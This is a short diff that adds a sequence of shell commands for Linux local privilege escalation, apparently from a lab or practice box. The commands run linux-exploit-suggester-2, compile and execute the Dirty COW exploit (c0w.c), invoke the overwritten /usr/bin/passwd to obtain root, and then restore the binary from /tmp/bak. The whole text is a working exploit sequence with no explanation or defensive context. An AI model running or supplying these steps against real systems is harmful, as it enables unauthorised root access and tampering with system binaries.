@@ -1,0 +1,11 @@
+perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
+
+gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+
+./c0w
+
+/usr/bin/passwd
+
+mv /tmp/bak /usr/bin/passwd
+
+exit
